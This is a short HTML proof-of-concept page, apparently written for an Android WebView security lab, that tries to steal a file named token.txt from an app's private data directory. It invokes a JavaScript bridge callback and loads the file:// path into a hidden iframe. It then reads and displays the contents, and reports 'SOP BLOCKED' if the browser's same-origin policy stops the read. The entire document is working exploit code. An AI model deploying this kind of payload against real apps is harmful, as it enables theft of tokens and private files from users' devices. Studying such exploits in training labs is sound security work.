<!DOCTYPE html>
<html>
  <head>
    <title>File Steal POC</title>
  </head>
  <body>
    <h2>Trying to steal token.txt...</h2>
    <pre id="leakedContent">Loading...</pre>

    <script>
      hextree.authCallback("a");
      function attemptFileSteal() {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none'; // hide iframe if you want
        iframe.onload = () => {
          try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            const content = iframeDoc.body.textContent;
            document.getElementById('leakedContent').innerText = content;
          } catch (e) {
            document.getElementById('leakedContent').innerText = 'SOP BLOCKED';
          }
        };
        document.body.appendChild(iframe);
        iframe.src = 'file:///data/data/io.hextree.attacksurface/files/token.txt';
      }

      attemptFileSteal();
    </script>
  </body>
</html>

